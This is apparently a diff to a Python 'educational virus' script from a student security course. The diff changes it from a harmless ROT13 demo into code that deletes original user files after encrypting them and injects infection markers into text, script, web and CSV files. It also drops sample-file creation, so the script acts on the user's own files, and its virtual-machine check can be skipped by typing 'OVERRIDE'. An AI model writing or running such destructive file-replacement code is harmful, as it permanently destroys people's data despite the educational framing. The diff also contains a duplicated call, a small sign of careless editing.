@@ -12,24 +12,23 @@ Institution: National Teachers College
 Date: June 2025
 Encryption: ROT13 Algorithm Only
 
-NEW FEATURES:
-- Word Document (.docx) support
-- PDF text extraction and encryption
-- Excel file (.xlsx) support
-- PowerPoint (.pptx) support
-- Document type detection
+MODIFICATIONS:
+- Original files are deleted after encryption (realistic simulation)
+- No auto-creation of sample files (user must provide test files)
+- More realistic malware behavior simulation
+- Enhanced encryption process with file replacement
 
 EDUCATIONAL OBJECTIVES:
-- Demonstrate malware behavior simulation across document types
-- Showcase ROT13 cryptographic implementation
+- Demonstrate realistic malware behavior simulation across document types
+- Showcase ROT13 cryptographic implementation with file replacement
 - Provide hands-on cybersecurity learning experience
 - Enable antivirus development and testing
 
 SAFETY FEATURES:
 - Virtual machine detection
 - Educational consent verification
-- Non-destructive file operations
 - Comprehensive activity logging
+- Controlled environment operation
 """
 
 import os
@@ -347,11 +346,11 @@ class SecurityValidator:
     ODYSSEY VIRUS
 ═══════════════════════════════════════════════════
 
-NEW FEATURES:
-• Word Document (.docx) encryption support
-• PDF text extraction and encryption
-• Excel (.xlsx) and PowerPoint (.pptx) support
-• Multi-format document processing
+BEHAVIORAL CHANGES:
+• Original files will be DELETED after encryption
+• No automatic sample file creation
+• More realistic malware simulation
+• Files will be permanently replaced with encrypted versions
 
 INSTITUTIONAL CONTEXT:
 • National Teachers College Cybersecurity Exercise
@@ -361,14 +360,15 @@ INSTITUTIONAL CONTEXT:
 SAFETY CONFIRMATION REQUIRED:
 ✓ I confirm this is for academic purposes only
 ✓ I am running this in a virtual machine environment  
-✓ I understand this is educational malware simulation
+✓ I understand original files will be deleted
+✓ I have backed up important files outside the target directory
 ✓ I will not distribute or misuse this program
 ✓ I accept responsibility for ethical usage
 
 TECHNICAL IMPLEMENTATION:
 • ROT13 cryptographic algorithm demonstration
-• Multi-format document processing
-• Non-destructive file operation simulation
+• Multi-format document processing with file replacement
+• Realistic malware behavior simulation
 • Antivirus development and testing framework
 
 Do you provide consent to proceed with this educational exercise?
@@ -391,7 +391,7 @@ class OdysseyVirus:
         
         # Virus identification and signature
         self.virus_signature = "ODYSSEY_VIRUS_2025_NTC"
-        self.virus_version = "2.0_EDUCATIONAL_MULTIDOC"
+        self.virus_version = "2.1_EDUCATIONAL"
         self.institution = "National Teachers College"
         
         # Cryptographic and document processing engines
@@ -416,16 +416,28 @@ class OdysseyVirus:
         
         # Educational messages (encrypted with ROT13)
         self.encrypted_educational_messages = [
-            "Raunaprq Bqlffrk Rqhpngvbany Ivehhf - Zhygv-Qbphzrag Fhccbeg",
-            "EBG13 Rapekcgvba Npebff Jbeq, CQS, naq Rkpry Qbphzragf",
-            "Angvbany Grnpuref Pbyyrtr - Nqinaprq Plorefrphevgl Rkrepvfr"
+            "Zbqvsvrq Bqlffrk Rqhpngvbany Ivehhf - Svyr Ercynprzrag Fvzhyngvba",
+            "EBG13 Rapekcgvba jvgu Bevtvany Svyr Qryrgvba",
+            "Natgvbany Grnpuref Pbyyrtr - Ernyvfgvp Znyjner Orunjvbe Fghql"
         ]
         
         # Execution statistics
         self.execution_start_time = None
         self.files_processed = 0
+        self.files_replaced = 0
+        self.files_infected = 0
         self.encryption_operations = 0
+        self.infection_operations = 0
         self.document_types_processed = {}
+        
+        # Infection payloads
+        self.infection_signatures = [
+            f"<!-- {self.virus_signature} INFECTION MARKER -->",
+            f"# {self.virus_signature} - Educational Malware Injection",
+            f"/* {self.virus_signature} - Virus Code Injection */",
+            f"// {self.virus_signature} - Script Infection",
+            f"# INFECTED BY {self.virus_signature} #"
+        ]
         
     def initialize_logging_system(self):
         """Initialize comprehensive activity logging system"""
@@ -442,6 +454,7 @@ Execution Started: {self.execution_start_time.strftime('%Y-%m-%d %H:%M:%S')}
 Encryption Algorithm: ROT13
 Target Environment: {self.target_directory}
 Supported Documents: {', '.join(self.supported_extensions)}
+Behavior: Original files will be deleted after encryption
 ═══════════════════════════════════════════════════════════════════
 
 """
@@ -468,109 +481,196 @@ Supported Documents: {', '.join(self.supported_extensions)}
             print(f"🔐 {activity_description}")
         elif category == "DOCUMENT":
             print(f"📄 {activity_description}")
+        elif category == "DELETE":
+            print(f"🗑️  {activity_description}")
         else:
             print(f"📝 {activity_description}")
     
-    def create_educational_test_environment(self):
-        """Create test environment with various document types"""
-        self.log_activity("Creating educational test environment", "INFO")
+    def setup_target_environment(self):
+        """Setup target environment directory (without creating sample files)"""
+        self.log_activity("Setting up target environment directory")
         
         if not os.path.exists(self.target_directory):
             os.makedirs(self.target_directory)
             self.log_activity(f"Created target directory: {self.target_directory}")
+        else:
+            self.log_activity(f"Target directory already exists: {self.target_directory}")
         
-        # Sample educational files for demonstration
-        test_files_config = [
-            {
-                "filename": "student_notes.txt",
-                "content": "Educational cybersecurity notes\nMalware analysis techniques\nAntivirus development principles\nROT13 encryption demonstration"
-            },
-            {
-                "filename": "research_data.csv", 
-                "content": "Student,Grade,Project,Document_Type\nAlice,95,Antivirus,Word_Doc\nBob,87,Cryptography,Excel_Sheet\nCharlie,92,Network_Security,PowerPoint"
-            },
-            {
-                "filename": "assignment_instructions.md",
-                "content": "# Cybersecurity Assignment\n\n## Objectives\n- Understand multi-format malware\n- Develop document-aware antivirus tools\n- Apply cryptographic techniques across file types\n\n## Supported Formats\n- Word Documents (.docx)\n- PDF Files (.pdf)\n- Excel Spreadsheets (.xlsx)\n- PowerPoint Presentations (.pptx)"
-            },
-            {
-                "filename": "lab_report.py",
-                "content": "#!/usr/bin/env python3\n# Cybersecurity Lab Report\n# Document Processing Analysis\n\ndef analyze_document_encryption():\n    print('ROT13 Encryption Analysis')\n    print('Multi-format Document Processing')\n    print('Malware Behavioral Study')\n    return 'Analysis Complete'\n\nif __name__ == '__main__':\n    analyze_document_encryption()"
-            }
-        ]
+        # Check if directory has user files
+        user_files = []
+        for filename in os.listdir(self.target_directory):
+            file_path = os.path.join(self.target_directory, filename)
+            if os.path.isfile(file_path) and not filename.startswith('.'):
+                file_extension = os.path.splitext(filename)[1].lower()
+                if file_extension in self.supported_extensions:
+                    user_files.append(filename)
         
-        # Create Word document if library is available
-        if DOCX_AVAILABLE:
-            self.create_sample_word_document()
+        if user_files:
+            self.log_activity(f"Found {len(user_files)} user files ready for processing")
+            for filename in user_files:
+                self.log_activity(f"  - {filename}")
+        else:
+            self.log_activity("No user files found in target directory", "WARNING")
+            self.log_activity("Users should place test files in the target directory before running the virus", "WARNING")
         
-        for file_config in test_files_config:
-            file_path = os.path.join(self.target_directory, file_config["filename"])
-            
-            if not os.path.exists(file_path):
-                with open(file_path, 'w', encoding='utf-8') as f:
-                    f.write(file_config["content"])
-                    f.write(f"\n\nFile created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-                    f.write(f"\nEducational context: National Teachers College")
-                    f.write(f"\nProject: Odyssey Virus Simulation")
-                
-                self.log_activity(f"Created educational file: {file_config['filename']}")
-        
-        self.log_activity("Educational test environment setup completed")
+        self.log_activity("Target environment setup completed")
     
-    def create_sample_word_document(self):
-        """Create sample Word document for testing"""
+    def infect_file(self, file_path):
+        """Inject virus signatures into files without encrypting them"""
         try:
-            from docx import Document
+            filename = os.path.basename(file_path)
+            file_extension = os.path.splitext(file_path)[1].lower()
             
-            doc_path = os.path.join(self.target_directory, "cybersecurity_report.docx")
+            # Read original file content
+            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                original_content = f.read()
             
-            if not os.path.exists(doc_path):
-                doc = Document()
-                
-                # Add title
-                doc.add_heading('Cybersecurity Research Report', 0)
-                
-                # Add content
-                doc.add_heading('Executive Summary', level=1)
-                doc.add_paragraph('This document contains research findings on educational malware simulation and ROT13 cryptographic implementation for academic cybersecurity learning.')
-                
-                doc.add_heading('Methodology', level=1)
-                doc.add_paragraph('Our research methodology includes:')
-                doc.add_paragraph('• Multi-format document analysis', style='List Bullet')
-                doc.add_paragraph('• ROT13 encryption implementation', style='List Bullet')
-                doc.add_paragraph('• Cross-platform malware simulation', style='List Bullet')
-                
-                doc.add_heading('Findings', level=1)
-                doc.add_paragraph('Key findings from our cybersecurity exercise demonstrate the importance of understanding document-based threats and implementing comprehensive detection mechanisms.')
-                
-                # Add table
-                table = doc.add_table(rows=1, cols=3)
-                hdr_cells = table.rows[0].cells
-                hdr_cells[0].text = 'Document Type'
-                hdr_cells[1].text = 'Encryption Method'
-                hdr_cells[2].text = 'Detection Rate'
-                
-                row_cells = table.add_row().cells
-                row_cells[0].text = 'Word Document'
-                row_cells[1].text = 'ROT13'
-                row_cells[2].text = '100%'
-                
-                doc.add_paragraph('\nDocument created for educational cybersecurity exercise.')
-                doc.add_paragraph(f'Institution: {self.institution}')
-                doc.add_paragraph(f'Date: {datetime.now().strftime("%Y-%m-%d")}')
-                
-                doc.save(doc_path)
-                self.log_activity("Created sample Word document: cybersecurity_report.docx", "DOCUMENT")
-                
+            # Skip if already infected
+            if self.virus_signature in original_content:
+                return False, "File already infected"
+            
+            # Create backup filename
+            backup_path = file_path + ".backup"
+            
+            # Create backup of original
+            with open(backup_path, 'w', encoding='utf-8') as f:
+                f.write(original_content)
+            
+            # Prepare infection payload based on file type
+            infected_content = self.prepare_infection_payload(original_content, file_extension)
+            
+            if infected_content is None:
+                return False, "File type not suitable for infection"
+            
+            # Write infected content back to original file
+            with open(file_path, 'w', encoding='utf-8') as f:
+                f.write(infected_content)
+            
+            self.files_infected += 1
+            self.infection_operations += 1
+            self.log_activity(f"INFECTED file: {filename}", "CRYPTO")
+            
+            return True, None
+            
         except Exception as e:
-            self.log_activity(f"Failed to create sample Word document: {str(e)}", "ERROR")
+            return False, f"Failed to infect file: {str(e)}"
     
-    def perform_file_encryption(self):
-        """File encryption supporting multiple document types"""
-        self.log_activity("Initiating multi-format file encryption", "CRYPTO")
+    def prepare_infection_payload(self, original_content, file_extension):
+        """Prepare infection payload based on file type"""
+        infection_timestamp = datetime.now().isoformat()
+        
+        if file_extension in ['.txt', '.md']:
+            # Text file infection
+            infected_content = f"{self.infection_signatures[0]}\n"
+            infected_content += f"<!-- Infection Time: {infection_timestamp} -->\n"
+            infected_content += f"<!-- Educational Virus Injection -->\n\n"
+            infected_content += original_content
+            infected_content += f"\n\n{self.infection_signatures[4]}"
+            infected_content += f"\nInfection performed for educational cybersecurity research"
+            infected_content += f"\nNational Teachers College - Security Analysis Project"
+            return infected_content
+            
+        elif file_extension in ['.py', '.js']:
+            # Script file infection
+            infected_content = f"{self.infection_signatures[1]}\n"
+            infected_content += f"# Infection Time: {infection_timestamp}\n"
+            infected_content += f"# Educational Purpose: Malware Behavior Simulation\n"
+            infected_content += f"# Institution: National Teachers College\n\n"
+            infected_content += original_content
+            infected_content += f"\n\n{self.infection_signatures[3]}"
+            infected_content += f"\n# Educational virus injection completed"
+            return infected_content
+            
+        elif file_extension in ['.html', '.css']:
+            # Web file infection
+            infected_content = f"{self.infection_signatures[2]}\n"
+            infected_content += f"/* Infection Time: {infection_timestamp} */\n"
+            infected_content += f"/* Educational Malware Simulation */\n\n"
+            infected_content += original_content
+            infected_content += f"\n\n<!-- {self.virus_signature} INFECTION END -->"
+            return infected_content
+            
+        elif file_extension == '.csv':
+            # CSV file infection
+            lines = original_content.split('\n')
+            infected_lines = [f"# {self.infection_signatures[1]}"]
+            infected_lines.extend(lines)
+            infected_lines.append(f"# Infected: {infection_timestamp}")
+            infected_lines.append(f"# Educational Purpose Only")
+            return '\n'.join(infected_lines)
+            
+        else:
+            # Generic text-based infection
+            infected_content = f"{self.infection_signatures[0]}\n"
+            infected_content += original_content
+            infected_content += f"\n{self.infection_signatures[4]}"
+            return infected_content
+    
+    def perform_file_infection(self):
+        """Perform file infection on suitable files"""
+        self.log_activity("Initiating file infection process", "CRYPTO")
         
         if not os.path.exists(self.target_directory):
-            self.create_educational_test_environment()
+            self.setup_target_environment()
+        
+        infection_manifest = {}
+        infected_files = []
+        
+        for filename in os.listdir(self.target_directory):
+            file_path = os.path.join(self.target_directory, filename)
+            
+            # Skip directories and special files
+            if not os.path.isfile(file_path) or filename.startswith('.'):
+                continue
+                
+            # Skip already processed files
+            if "ODYSSEY_ENCRYPTED" in filename or "ODYSSEY_LOCKED" in filename:
+                continue
+                
+            # Skip system files
+            if filename in [self.log_file, self.marker_file, self.payload_file]:
+                continue
+            
+            # Check if file extension is suitable for infection
+            file_extension = os.path.splitext(filename)[1].lower()
+            if file_extension not in ['.txt', '.md', '.csv', '.py', '.js', '.html', '.css']:
+                continue
+            
+            # Attempt infection
+            success, error = self.infect_file(file_path)
+            
+            if success:
+                infection_manifest[filename] = {
+                    "original_filename": filename,
+                    "file_type": file_extension,
+                    "infection_timestamp": datetime.now().isoformat(),
+                    "virus_signature": self.virus_signature,
+                    "infection_type": "content_injection",
+                    "backup_created": True,
+                    "backup_filename": filename + ".backup"
+                }
+                infected_files.append(filename)
+                self.log_activity(f"Successfully infected: {filename}", "CRYPTO")
+            elif error:
+                self.log_activity(f"Failed to infect {filename}: {error}", "WARNING")
+        
+        # Save infection manifest
+        if infected_files:
+            infection_manifest_path = os.path.join(self.target_directory, "odyssey_infection_manifest.json")
+            with open(infection_manifest_path, 'w', encoding='utf-8') as f:
+                json.dump(infection_manifest, f, indent=2)
+            
+            self.log_activity(f"Infection manifest saved: {len(infected_files)} files infected", "CRYPTO")
+        
+        self.log_activity(f"File infection completed: {len(infected_files)} files infected")
+        return len(infected_files)
+    
+    def perform_file_encryption(self):
+        """File encryption supporting multiple document types with original file deletion"""
+        self.log_activity("Initiating multi-format file encryption with file replacement", "CRYPTO")
+        
+        if not os.path.exists(self.target_directory):
+            self.setup_target_environment()
         
         encryption_manifest = {}
         processed_files = []
@@ -605,6 +705,10 @@ Supported Documents: {', '.join(self.supported_extensions)}
                 if text_content is None:
                     self.log_activity(f"No text content extracted from {filename}", "WARNING")
                     continue
+                
+                # Store original file info before deletion
+                original_file_size = os.path.getsize(file_path)
+                original_file_hash = self.calculate_file_hash(file_path)
                 
                 # Apply ROT13 encryption to extracted text
                 encrypted_content = self.crypto_engine.rot13_encrypt(text_content)
@@ -644,17 +748,34 @@ Supported Documents: {', '.join(self.supported_extensions)}
                         f.write(f"\n<!-- Document Type: {extension} -->")
                         f.write(f"\n<!-- Timestamp: {datetime.now().isoformat()} -->")
                 
+                # **CRITICAL CHANGE: Delete the original file after successful encryption**
+                try:
+                    os.remove(file_path)
+                    self.log_activity(f"DELETED original file: {filename}", "DELETE")
+                    self.files_replaced += 1
+                except Exception as delete_error:
+                    self.log_activity(f"Failed to delete original file {filename}: {str(delete_error)}", "ERROR")
+                    # Remove the encrypted file if we couldn't delete the original
+                    try:
+                        os.remove(encrypted_file_path)
+                        self.log_activity(f"Removed encrypted file due to deletion failure: {encrypted_filename}", "ERROR")
+                    except:
+                        pass
+                    continue
+                
                 # Update encryption manifest
                 encryption_manifest[encrypted_filename] = {
                     "original_filename": filename,
                     "original_type": file_extension,
                     "encryption_algorithm": "ROT13",
                     "encryption_timestamp": datetime.now().isoformat(),
-                    "file_size_original": os.path.getsize(file_path),
+                    "file_size_original": original_file_size,
                     "file_size_encrypted": os.path.getsize(encrypted_file_path),
+                    "original_file_hash": original_file_hash,
                     "virus_signature": self.virus_signature,
                     "text_length": len(text_content),
-                    "encrypted_length": len(encrypted_content)
+                    "encrypted_length": len(encrypted_content),
+                    "original_file_deleted": True
                 }
                 
                 # Update statistics
@@ -668,7 +789,7 @@ Supported Documents: {', '.join(self.supported_extensions)}
                 else:
                     self.document_types_processed[file_extension] = 1
                 
-                self.log_activity(f"Encrypted {file_extension} file: {filename} -> {encrypted_filename}", "CRYPTO")
+                self.log_activity(f"REPLACED {filename} with {encrypted_filename}", "CRYPTO")
                 
             except Exception as e:
                 self.log_activity(f"Failed to encrypt {filename}: {str(e)}", "ERROR")
@@ -679,12 +800,24 @@ Supported Documents: {', '.join(self.supported_extensions)}
             json.dump(encryption_manifest, f, indent=2)
         
         self.log_activity(f"Encryption manifest saved: {len(encryption_manifest)} entries", "CRYPTO")
-        self.log_activity(f"Encryption completed: {len(processed_files)} files processed")
+        self.log_activity(f"File replacement completed: {len(processed_files)} files processed")
+        self.log_activity(f"Original files deleted: {self.files_replaced}")
         
         # Log document type statistics
         self.log_activity("Document type processing statistics:", "INFO")
         for doc_type, count in self.document_types_processed.items():
             self.log_activity(f"  {doc_type}: {count} files", "INFO")
+    
+    def calculate_file_hash(self, filepath):
+        """Calculate SHA-256 hash of file"""
+        try:
+            hash_sha256 = hashlib.sha256()
+            with open(filepath, 'rb') as f:
+                for chunk in iter(lambda: f.read(4096), b""):
+                    hash_sha256.update(chunk)
+            return hash_sha256.hexdigest()
+        except Exception:
+            return None
     
     def display_educational_messages(self):
         """Display educational popup messages with ROT13 decryption demonstration"""
@@ -704,14 +837,21 @@ ENCRYPTED (ROT13): {encrypted_message}
 
 DECRYPTED: {decrypted_message}
 
-This demonstrates ROT13 encryption/decryption across multiple document types:
+BEHAVIORAL CHANGES:
+• Original files are now DELETED after encryption
+• Files are permanently replaced with encrypted versions
+• No automatic sample file creation
+• More realistic malware simulation
+
+MULTI-DOCUMENT SUPPORT:
 • Word Documents (.docx)
 • PDF Files (.pdf)
 • Excel Spreadsheets (.xlsx)
 • PowerPoint Presentations (.pptx)
 • Plain Text Files (.txt, .md, .csv)
 
-Educational Purpose: Cybersecurity Learning & Antivirus Development
+Educational Purpose: Advanced Cybersecurity Learning & Antivirus Development
+Files Replaced: {self.files_replaced}
 """
                 
                 messagebox.showinfo(f"Odyssey Message {i}", dialog_content)
@@ -729,7 +869,8 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
                 print(f"\n═══ ODYSSEY MESSAGE {i} ═══")
                 print(f"ENCRYPTED: {encrypted_message}")
                 print(f"DECRYPTED: {decrypted_message}")
-                print("Multi-Document Support: Word, PDF, Excel, PowerPoint")
+                print("BEHAVIOR: Original files deleted and replaced")
+                print(f"Files Replaced: {self.files_replaced}")
                 print("═" * 50)
                 
                 self.log_activity(f"Console message {i}: {decrypted_message}")
@@ -745,6 +886,13 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
                 "signature": self.virus_signature,
                 "version": self.virus_version,
                 "institution": self.institution
+            },
+            "behavioral_changes": {
+                "original_file_deletion": True,
+                "file_replacement": True,
+                "file_infection": True,
+                "no_sample_creation": True,
+                "realistic_simulation": True
             },
             "cryptographic_implementation": {
                 "primary_algorithm": "ROT13",
@@ -764,21 +912,25 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
                 "creation_timestamp": datetime.now().isoformat(),
                 "target_environment": self.target_directory,
                 "files_processed": self.files_processed,
+                "files_infected": self.files_infected,
+                "files_replaced": self.files_replaced,
                 "encryption_operations": self.encryption_operations,
+                "infection_operations": self.infection_operations,
                 "document_types_processed": self.document_types_processed
             },
             "educational_context": {
-                "project_type": "Academic Cybersecurity Exercise",
+                "project_type": "Advanced Academic Cybersecurity Exercise",
                 "learning_objectives": [
-                    "Multi-format malware behavior analysis",
-                    "ROT13 cryptographic implementation", 
+                    "File infection with virus signature injection",
+                    "Realistic multi-format malware behavior analysis",
+                    "ROT13 cryptographic implementation with file replacement", 
                     "Document-aware antivirus development",
-                    "Cross-platform cybersecurity research"
+                    "Advanced cybersecurity threat simulation"
                 ],
                 "safety_measures": [
                     "Virtual machine requirement",
                     "Educational consent verification",
-                    "Non-destructive operations",
+                    "File replacement simulation",
                     "Comprehensive logging"
                 ]
             },
@@ -787,11 +939,15 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
                     "*ODYSSEY_ENCRYPTED*",
                     self.virus_signature,
                     "ROT13 encrypted content",
-                    ".odyssey_infection_marker"
+                    ".odyssey_infection_marker",
+                    "INFECTION MARKER",
+                    "Educational Malware Injection"
                 ],
                 "decryption_algorithm": "ROT13",
-                "removal_strategy": "Extract and decrypt document content, restore original files",
-                "document_processing": "Handle multiple document formats appropriately"
+                "removal_strategy": "Decrypt encrypted files, clean infected files, restore content (original files deleted)",
+                "document_processing": "Handle multiple document formats, note that originals are gone",
+                "infection_cleaning": "Remove virus signatures from infected files, restore from backups if available",
+                "recovery_limitation": "Original files deleted - can only recover decrypted content and clean infections"
             }
         }
         
@@ -803,19 +959,18 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
             f.write(encrypted_payload)
             f.write(f"\n\n<!-- {self.virus_signature} -->")
             f.write(f"\n<!-- Payload encrypted with ROT13 -->")
-            f.write(f"\n<!-- Multi-Document Support -->")
+            f.write(f"\n<!-- File Replacement -->")
         
         self.log_activity(f"Encrypted payload generated: {self.payload_file}", "CRYPTO")
     
     def simulate_file_manipulation(self):
-        """Simulate temporary file manipulation behaviors"""
-        self.log_activity("Simulating file manipulation behaviors")
+        """Simulate temporary file manipulation behaviors (only on encrypted files)"""
+        self.log_activity("Simulating file manipulation behaviors on encrypted files")
         
         manipulation_targets = []
         
         for filename in os.listdir(self.target_directory):
-            file_extension = os.path.splitext(filename)[1].lower()
-            if file_extension in ['.txt', '.md'] and not filename.startswith('ODYSSEY_'):
+            if "ODYSSEY_ENCRYPTED" in filename and not filename.startswith('ODYSSEY_LOCKED_'):
                 file_path = os.path.join(self.target_directory, filename)
                 locked_filename = f"ODYSSEY_LOCKED_{filename}"
                 locked_path = os.path.join(self.target_directory, locked_filename)
@@ -823,18 +978,18 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
                 try:
                     os.rename(file_path, locked_path)
                     manipulation_targets.append((locked_path, file_path))
-                    self.log_activity(f"Temporarily locked file: {filename}")
+                    self.log_activity(f"Temporarily locked encrypted file: {filename}")
                 except Exception as e:
                     self.log_activity(f"Failed to lock {filename}: {str(e)}", "ERROR")
         
-        self.log_activity("Simulating document processing (3 seconds)...")
+        self.log_activity("Simulating encrypted document processing (3 seconds)...")
         time.sleep(3)
         
         for locked_path, original_path in manipulation_targets:
             try:
                 os.rename(locked_path, original_path)
                 original_filename = os.path.basename(original_path)
-                self.log_activity(f"Restored file: {original_filename}")
+                self.log_activity(f"Restored encrypted file: {original_filename}")
             except Exception as e:
                 self.log_activity(f"Failed to restore {original_path}: {str(e)}", "ERROR")
         
@@ -851,7 +1006,8 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
                 "virus_signature": self.virus_signature,
                 "virus_version": self.virus_version,
                 "infection_timestamp": self.execution_start_time.isoformat(),
-                "execution_duration_seconds": execution_duration.total_seconds()
+                "execution_duration_seconds": execution_duration.total_seconds(),
+                "behavioral_modification": "File replacement simulation"
             },
             "system_information": {
                 "platform": platform.platform(),
@@ -860,7 +1016,10 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
             },
             "execution_statistics": {
                 "files_processed": self.files_processed,
+                "files_infected": self.files_infected,
+                "files_replaced": self.files_replaced,
                 "encryption_operations": self.encryption_operations,
+                "infection_operations": self.infection_operations,
                 "messages_displayed": len(self.encrypted_educational_messages),
                 "document_types_processed": self.document_types_processed
             },
@@ -871,9 +1030,16 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
                 "pptx_support": PPTX_AVAILABLE,
                 "supported_extensions": self.supported_extensions
             },
+            "behavioral_characteristics": {
+                "original_file_deletion": True,
+                "file_replacement": True,
+                "file_infection": True,
+                "sample_file_creation": False,
+                "realistic_malware_simulation": True
+            },
             "educational_context": {
                 "institution": self.institution,
-                "project_type": "ROT13 Multi-Document Demonstration",
+                "project_type": "ROT13 Multi-Document Demonstration with File Replacement",
                 "safety_verified": True
             },
             "antivirus_guidance": {
@@ -882,7 +1048,8 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
                 "encrypted_files_pattern": "*ODYSSEY_ENCRYPTED*",
                 "payload_location": self.payload_file,
                 "manifest_location": self.encryption_log_file,
-                "document_processing_required": True
+                "document_processing_required": True,
+                "recovery_limitation": "Original files deleted - can only create recovered versions"
             }
         }
         
@@ -895,6 +1062,7 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
     def execute_educational_simulation(self):
         """Main execution routine for educational virus simulation"""
         print("👿 ODYSSEY VIRUS - EXECUTION STARTING")
+        print("🗑️  WARNING: Original files will be DELETED and replaced with encrypted versions")
         print("📄 Multi-Document Support: Word, PDF, Excel, PowerPoint")
         print("═" * 60)
         
@@ -911,6 +1079,7 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
             if not SecurityValidator.detect_virtual_environment():
                 self.log_activity("Virtual environment not detected", "WARNING")
                 print("⚠️  WARNING: Virtual machine environment not detected!")
+                print("⚠️  WARNING: Original files will be DELETED!")
                 
                 override_response = input("Type 'OVERRIDE' to continue: ").strip()
                 if override_response != 'OVERRIDE':
@@ -920,6 +1089,7 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
             
             self.log_activity("Safety verification completed successfully")
             print("✅ Safety verification passed. Beginning simulation...")
+            print("🗑️  NOTE: Original files will be permanently replaced with encrypted versions")
             print()
             
             # Display available document processing capabilities
@@ -932,22 +1102,26 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
             print()
             
             # Execute virus behaviors
-            print("📁 Phase 1: Environment Setup")
-            self.create_educational_test_environment()
+            print("📁 Phase 1: Target Environment Setup")
+            self.setup_target_environment()
             
-            print("\n🔐 Phase 2: Multi-Format File Encryption")
+            print("\n🦠 Phase 2: File Infection Process")
+            infected_count = self.perform_file_infection()
+            
+            print("\n🔐 Phase 3: Multi-Format File Encryption & Replacement")
             self.perform_file_encryption()
             
-            print("\n💬 Phase 3: Educational Messages")
+            print("\n💬 Phase 4: Educational Messages")
             self.display_educational_messages()
             
-            print("\n📦 Phase 4: Payload Generation")
+            print("\n📦 Phase 5: Payload Generation")
             self.generate_payload()
             
-            print("\n🔄 Phase 5: File Manipulation Simulation")
+            print("\n🔄 Phase 6: File Manipulation Simulation")
             self.simulate_file_manipulation()
             
-            print("\n🎯 Phase 6: Infection Marker")
+            print("\n🎯 Phase 7: Infection Marker")
+            self.create_infection_marker()
             self.create_infection_marker()
             
             # Execution summary
@@ -958,7 +1132,10 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
             print(f"📊 Execution Statistics:")
             print(f"   • Duration: {execution_duration.total_seconds():.2f} seconds")
             print(f"   • Files processed: {self.files_processed}")
+            print(f"   • Files infected: {self.files_infected}")
+            print(f"   • Files replaced: {self.files_replaced}")
             print(f"   • Encryption operations: {self.encryption_operations}")
+            print(f"   • Infection operations: {self.infection_operations}")
             print(f"   • Document types: {len(self.document_types_processed)}")
             print(f"   • Target directory: {self.target_directory}")
             
@@ -974,10 +1151,12 @@ Educational Purpose: Cybersecurity Learning & Antivirus Development
             print(f"   • Encryption manifest: {self.encryption_log_file}")
             print()
             print("🎓 Educational objectives achieved:")
-            print("   ✓ Multi-format document processing")
+            print("   ✓ File infection with virus signature injection")
+            print("   ✓ Realistic multi-format document processing with file replacement")
             print("   ✓ ROT13 encryption across document types")
             print("   ✓ Advanced malware behavior simulation")
-            print("   ✓ Antivirus detection targets")
+            print("   ✓ Original file deletion simulation")
+            print("   ✓ Antivirus detection and recovery challenges")
             print("   ✓ Comprehensive logging and reporting")
             
             self.log_activity("Odyssey virus simulation completed successfully")
@@ -997,18 +1176,26 @@ def main():
     """Main entry point for Odyssey Virus"""
     print("🎓 ODYSSEY VIRUS")
     print("National Teachers College - Information Assurance and Security 1 Finals Project")
-    print("ROT13 Multi-Document Cryptographic Implementation")
+    print("ROT13 Multi-Document Cryptographic Implementation with File Replacement")
     print("=" * 60)
     print()
     print("⚠️  EDUCATIONAL PURPOSE ONLY")
+    print("⚠️  WARNING: ORIGINAL FILES WILL BE DELETED")
     print("Must be executed in virtual machine environment")
     print("For academic cybersecurity learning and research")
     print()
-    print("📄 NEW: Multi-Document Format Support")
+    print("📄 BEHAVIORAL CHANGES:")
+    print("   • Original files are deleted after encryption")
+    print("   • No automatic sample file creation")
+    print("   • Files are permanently replaced with encrypted versions")
+    print("   • More realistic malware behavior simulation")
+    print()
+    print("📄 Multi-Document Format Support:")
     print("   • Word Documents (.docx)")
     print("   • PDF Files (.pdf)")
     print("   • Excel Spreadsheets (.xlsx)")
     print("   • PowerPoint Presentations (.pptx)")
+    print("   • Text Files (.txt, .md, .csv, .py, .js, .html, .css)")
     print()
     
     # Check for optional libraries
@@ -1029,13 +1216,24 @@ def main():
         print("\nInstall with: pip install python-docx PyPDF2 openpyxl python-pptx")
         print("(Virus will work with reduced functionality)\n")
     
+    print("📁 SETUP INSTRUCTIONS:")
+    print("   1. Create the 'odyssey_test_environment' directory")
+    print("   2. Place your test files in that directory")
+    print("   3. Run this virus to encrypt and replace those files")
+    print("   4. Use your antivirus to detect and recover the files")
+    print()
+    
     try:
         odyssey = OdysseyVirus()
         success = odyssey.execute_educational_simulation()
         
         if success:
             print("\n🎯 Ready for antivirus development and testing!")
-            print("Your antivirus will need to handle multiple document formats.")
+            print("Your antivirus will need to handle:")
+            print("   • Multiple document formats")
+            print("   • ROT13 decryption")
+            print("   • File recovery (originals are deleted)")
+            print("   • Encrypted file detection and processing")
         else:
             print("\n📚 Review safety requirements and try again in proper environment.")
             
